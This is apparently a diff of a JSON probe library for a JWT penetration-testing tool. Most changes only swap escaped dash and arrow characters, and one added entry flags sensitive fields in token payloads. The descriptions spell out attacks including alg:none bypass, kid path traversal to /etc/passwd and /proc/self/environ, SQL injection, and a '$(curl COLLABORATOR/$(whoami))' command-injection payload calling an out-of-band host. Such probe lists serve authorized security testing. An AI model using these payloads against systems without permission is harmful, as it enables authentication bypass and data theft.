@@ -10,7 +10,7 @@
   "auto_probe_note": "JWT attacks require manual token manipulation. Use test_jwt tool or decode_encode + send_http_request for JWT testing. auto_probe probes serve as checklists only.",
   "contexts": {
     "alg_none": {
-      "description": "JWT algorithm none bypass \u2014 strip signature",
+      "description": "JWT algorithm none bypass — strip signature",
       "tech_match": [],
       "param_match": [
         "token",
@@ -93,7 +93,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ../../etc/passwd \u2014 path traversal in key lookup. /etc/passwd content as HMAC secret confirms read AND key forgery.",
+          "description": "[Manual] kid: ../../etc/passwd — path traversal in key lookup. /etc/passwd content as HMAC secret confirms read AND key forgery.",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -110,7 +110,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ../../../proc/self/environ \u2014 read process environment as HMAC secret. Pivots from JWT forge to env-var disclosure.",
+          "description": "[Manual] kid: ../../../proc/self/environ — read process environment as HMAC secret. Pivots from JWT forge to env-var disclosure.",
           "note": "Use test_jwt tool. After read, sign with the leaked content as HMAC secret.",
           "matchers": [
             {
@@ -127,7 +127,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: /dev/null \u2014 sign with empty string as secret. Some libs read empty bytes from /dev/null and accept HMAC of empty string.",
+          "description": "[Manual] kid: /dev/null — sign with empty string as secret. Some libs read empty bytes from /dev/null and accept HMAC of empty string.",
           "note": "Use test_jwt tool. Sign JWT with HMAC-SHA256 secret = '' (empty).",
           "matchers": [
             {
@@ -149,7 +149,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ../../tmp/known_file \u2014 write a known file to /tmp via separate vuln (SSRF, file_upload), then point kid at it. Predictable HMAC secret.",
+          "description": "[Manual] kid: ../../tmp/known_file — write a known file to /tmp via separate vuln (SSRF, file_upload), then point kid at it. Predictable HMAC secret.",
           "note": "Chain prerequisite: write primitive on target host.",
           "matchers": [
             {
@@ -164,7 +164,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ' UNION SELECT 'key'-- \u2014 SQLi in key ID lookup. Server returns attacker-controlled key, allowing forgery.",
+          "description": "[Manual] kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup. Server returns attacker-controlled key, allowing forgery.",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -186,7 +186,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: known_kid\\u0000injected \u2014 null byte truncation. Some libs trim at null while DB lookup uses full string.",
+          "description": "[Manual] kid: known_kid\\u0000injected — null byte truncation. Some libs trim at null while DB lookup uses full string.",
           "note": "Use test_jwt tool.",
           "matchers": [
             {
@@ -208,7 +208,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: $(curl COLLABORATOR/$(whoami)) \u2014 command injection in shelled-out key fetch. Replace COLLABORATOR with generate_collaborator_payload().",
+          "description": "[Manual] kid: $(curl COLLABORATOR/$(whoami)) — command injection in shelled-out key fetch. Replace COLLABORATOR with generate_collaborator_payload().",
           "note": "Rare but devastating. Confirm via Collaborator DNS hit.",
           "matchers": [
             {
@@ -228,7 +228,7 @@
       ]
     },
     "jku_injection": {
-      "description": "JWT jku/x5u header injection \u2014 attacker-controlled key URL",
+      "description": "JWT jku/x5u header injection — attacker-controlled key URL",
       "tech_match": [],
       "param_match": [
         "token",
@@ -238,7 +238,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] jku: https://{{callback}}/jwks.json \u2014 SSRF via key URL",
+          "description": "[Manual] jku: https://{{callback}}/jwks.json — SSRF via key URL",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -292,7 +292,7 @@
       ]
     },
     "embedded_jwk": {
-      "description": "JWT embedded JWK attack \u2014 attacker embeds own public key in JWT header",
+      "description": "JWT embedded JWK attack — attacker embeds own public key in JWT header",
       "tech_match": [],
       "param_match": [
         "token",
@@ -304,7 +304,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] JWT with jwk header containing attacker-generated RSA public key \u2014 server may verify with the embedded key instead of server key",
+          "description": "[Manual] JWT with jwk header containing attacker-generated RSA public key — server may verify with the embedded key instead of server key",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -332,7 +332,7 @@
       ]
     },
     "x5c_injection": {
-      "description": "JWT x5c header injection \u2014 embed self-signed certificate chain",
+      "description": "JWT x5c header injection — embed self-signed certificate chain",
       "tech_match": [],
       "param_match": [
         "token",
@@ -343,7 +343,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] JWT with x5c header containing attacker's self-signed certificate \u2014 server may use embedded cert for verification",
+          "description": "[Manual] JWT with x5c header containing attacker's self-signed certificate — server may use embedded cert for verification",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -371,7 +371,7 @@
       ]
     },
     "claim_manipulation": {
-      "description": "JWT claim manipulation \u2014 modify role, sub, or admin claims to escalate privileges",
+      "description": "JWT claim manipulation — modify role, sub, or admin claims to escalate privileges",
       "tech_match": [],
       "param_match": [
         "token",
@@ -383,7 +383,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Change role claim from 'user' to 'admin' \u2014 re-sign or use with alg:none",
+          "description": "[Manual] Change role claim from 'user' to 'admin' — re-sign or use with alg:none",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -411,7 +411,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Change sub claim from 'user1' to 'admin' \u2014 IDOR via JWT subject manipulation",
+          "description": "[Manual] Change sub claim from 'user1' to 'admin' — IDOR via JWT subject manipulation",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -439,7 +439,7 @@
       ]
     },
     "expired_token": {
-      "description": "Expired JWT acceptance \u2014 server does not validate exp claim",
+      "description": "Expired JWT acceptance — server does not validate exp claim",
       "tech_match": [],
       "param_match": [
         "token",
@@ -451,7 +451,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Send JWT with exp set in the past (e.g., epoch 1) \u2014 server should reject but may not validate expiry",
+          "description": "[Manual] Send JWT with exp set in the past (e.g., epoch 1) — server should reject but may not validate expiry",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [
             {
@@ -479,7 +479,7 @@
       ]
     },
     "kid_path_traversal": {
-      "description": "kid header path traversal \u2014 point at a file with predictable content (e.g., /dev/null = empty key, /proc/self/environ = process env), then sign HMAC with that content. Distinct from kid_injection in that it lists OS-specific gadget paths.",
+      "description": "kid header path traversal — point at a file with predictable content (e.g., /dev/null = empty key, /proc/self/environ = process env), then sign HMAC with that content. Distinct from kid_injection in that it lists OS-specific gadget paths.",
       "tech_match": [],
       "param_match": [
         "token",
@@ -489,7 +489,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: /dev/null \u2014 empty file = empty HMAC key; sign with empty string",
+          "description": "[Manual] kid: /dev/null — empty file = empty HMAC key; sign with empty string",
           "note": "Manual.",
           "matchers": [
             {
@@ -511,7 +511,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: file:///dev/null \u2014 protocol smuggling variant",
+          "description": "[Manual] kid: file:///dev/null — protocol smuggling variant",
           "note": "Manual.",
           "matchers": [
             {
@@ -532,7 +532,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ../../../../../proc/self/cmdline \u2014 read self command-line as key material",
+          "description": "[Manual] kid: ../../../../../proc/self/cmdline — read self command-line as key material",
           "note": "Manual.",
           "matchers": [
             {
@@ -551,7 +551,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Windows: kid: ..\\..\\..\\..\\windows\\win.ini \u2014 IIS variant",
+          "description": "[Manual] Windows: kid: ..\\..\\..\\..\\windows\\win.ini — IIS variant",
           "note": "Manual.",
           "matchers": [
             {
@@ -595,7 +595,7 @@
       ]
     },
     "jwe_rsa_oaep_downgrade": {
-      "description": "JWE RSA-OAEP \u2192 RSA1_5 / dir downgrade. If the server accepts multiple alg values, swap to a weaker one (RSA1_5 is vulnerable to Bleichenbacher; dir requires no signature).",
+      "description": "JWE RSA-OAEP → RSA1_5 / dir downgrade. If the server accepts multiple alg values, swap to a weaker one (RSA1_5 is vulnerable to Bleichenbacher; dir requires no signature).",
       "tech_match": [],
       "param_match": [
         "token",
@@ -643,7 +643,7 @@
       ]
     },
     "jwe_zip_oracle": {
-      "description": "JWE compression (zip=DEF) oracle. When a JWE uses DEFLATE before encryption, attacker-supplied plaintext content ratios can leak via response-time/length differences \u2014 observe whether known-plaintext compression ratios match.",
+      "description": "JWE compression (zip=DEF) oracle. When a JWE uses DEFLATE before encryption, attacker-supplied plaintext content ratios can leak via response-time/length differences — observe whether known-plaintext compression ratios match.",
       "tech_match": [],
       "param_match": [
         "token",
@@ -654,7 +654,7 @@
         {
           "payload": "{{baseline}}",
           "description": "[Manual] Forge JWE with zip=DEF and a payload containing a known string + a guessed secret prefix; compare response timings to detect compression hits",
-          "note": "Manual; oracle attack \u2014 requires N tokens to converge.",
+          "note": "Manual; oracle attack — requires N tokens to converge.",
           "matchers": [
             {
               "type": "differential_timing",
@@ -677,7 +677,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] jku: https://COLLABORATOR/jwks.json \u2014 host a JWKS with attacker public key; forge token signed with matching private key",
+          "description": "[Manual] jku: https://COLLABORATOR/jwks.json — host a JWKS with attacker public key; forge token signed with matching private key",
           "note": "OOB confirmation via Collaborator hit.",
           "matchers": [
             {
@@ -693,7 +693,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] x5u: https://COLLABORATOR/cert.pem \u2014 same attack via x5u (x509 cert URL)",
+          "description": "[Manual] x5u: https://COLLABORATOR/cert.pem — same attack via x5u (x509 cert URL)",
           "note": "OOB confirmation via Collaborator hit.",
           "matchers": [
             {
@@ -720,7 +720,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Embed attacker-generated jwk in JWT header, sign with matching private key \u2014 bypasses the entire trust chain",
+          "description": "[Manual] Embed attacker-generated jwk in JWT header, sign with matching private key — bypasses the entire trust chain",
           "note": "Manual.",
           "matchers": [
             {
@@ -755,7 +755,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "Send 2 concurrent requests \u2014 one POST /revoke-token, one GET /protected with same token. status_2 = 200 after status_1 ack = bypass.",
+          "description": "Send 2 concurrent requests — one POST /revoke-token, one GET /protected with same token. status_2 = 200 after status_1 ack = bypass.",
           "matchers": [
             {
               "type": "status",
@@ -777,7 +777,7 @@
       ]
     },
     "cty_content_type_confusion": {
-      "description": "JWT cty (Content Type) header forces JWS payload to be re-parsed as XML/HTML \u2014 bypass JWS signature verification.",
+      "description": "JWT cty (Content Type) header forces JWS payload to be re-parsed as XML/HTML — bypass JWS signature verification.",
       "tech_match": [
         "jwt"
       ],
@@ -785,7 +785,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "Forge JWT with header cty=text/xml \u2014 body parsed as XML, attacker controls XML entities",
+          "description": "Forge JWT with header cty=text/xml — body parsed as XML, attacker controls XML entities",
           "matchers": [
             {
               "type": "status",
@@ -811,7 +811,7 @@
       ]
     },
     "jwe_wrapped_plain_inner_bypass_2026": {
-      "description": "pac4j-jwt JWE-wrapped PlainJWT auth bypass (CVE-2026-29000 class) \u2014 server accepts JWE outer envelope and trusts inner JOSE header alg:none PlainJWT without re-verifying. Forge token with arbitrary 'sub'.",
+      "description": "pac4j-jwt JWE-wrapped PlainJWT auth bypass (CVE-2026-29000 class) — server accepts JWE outer envelope and trusts inner JOSE header alg:none PlainJWT without re-verifying. Forge token with arbitrary 'sub'.",
       "tech_match": [
         "pac4j",
         "Java",
@@ -826,7 +826,7 @@
         {
           "payload": "{{baseline}}",
           "description": "[Manual] Build JWE(alg=dir, enc=A128CBC-HS256) wrapping PlainJWT({alg:none}) with attacker sub claim",
-          "note": "Requires manual crafting \u2014 use python-jose / pyjwt + decode_encode to construct then send via curl_request",
+          "note": "Requires manual crafting — use python-jose / pyjwt + decode_encode to construct then send via curl_request",
           "matchers": [
             {
               "type": "status",
@@ -849,7 +849,7 @@
       ]
     },
     "pyjwt_algorithm_confusion_2026": {
-      "description": "PyJWT algorithm-confusion variant (CVE-2026-48526 class) \u2014 server's PyJWT decode accepts HS256 token signed with the asymmetric PUBLIC key when caller passes the key as a string rather than KeyObject. Classic alg-confusion echo.",
+      "description": "PyJWT algorithm-confusion variant (CVE-2026-48526 class) — server's PyJWT decode accepts HS256 token signed with the asymmetric PUBLIC key when caller passes the key as a string rather than KeyObject. Classic alg-confusion echo.",
       "tech_match": [
         "PyJWT",
         "Python",
@@ -864,7 +864,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Re-sign JWT as HS256 using the public RSA key (or ES256\u2192HS256 if ES key known)",
+          "description": "[Manual] Re-sign JWT as HS256 using the public RSA key (or ES256→HS256 if ES key known)",
           "note": "Requires public key (often /.well-known/jwks.json) and decode_encode tool",
           "matchers": [
             {
@@ -880,7 +880,7 @@
       ]
     },
     "unknown_alg_signature_skip_2026": {
-      "description": "HarbourJwt 'unknown alg' bypass (CVE-2026-23993 class) \u2014 server treats unrecognised alg value as 'skip signature verification' and accepts arbitrary payload. Detect via random-alg token acceptance.",
+      "description": "HarbourJwt 'unknown alg' bypass (CVE-2026-23993 class) — server treats unrecognised alg value as 'skip signature verification' and accepts arbitrary payload. Detect via random-alg token acceptance.",
       "tech_match": [
         "HarbourJwt"
       ],
@@ -892,7 +892,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Forge JWT with alg='foo' or alg='NONE' (case variation) \u2014 server should reject; if 200, signature skipped",
+          "description": "[Manual] Forge JWT with alg='foo' or alg='NONE' (case variation) — server should reject; if 200, signature skipped",
           "matchers": [
             {
               "type": "status",
@@ -903,6 +903,34 @@
           ],
           "severity": "high",
           "confidence_boost": 60
+        }
+      ]
+    },
+    "jwt_payload_sensitive_data": {
+      "description": "JWT token contains sensitive data in its payload: password hashes, TOTP secrets, PII, or internal role/admin flags. The JWT payload is base64-encoded (not encrypted) — any holder reads the data. Found on OWASP Juice Shop where the admin JWT contained an MD5 password hash and TOTP secret.",
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Decode JWT payload (base64 second segment) and check for sensitive field names: password, hash, secret, totp, ssn, credit_card, api_key. The payload is public data — no brute force needed.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "password",
+                "hash",
+                "secret",
+                "totp",
+                "totpSecret",
+                "ssn",
+                "credit_card",
+                "api_key",
+                "private_key"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70
         }
       ]
     }
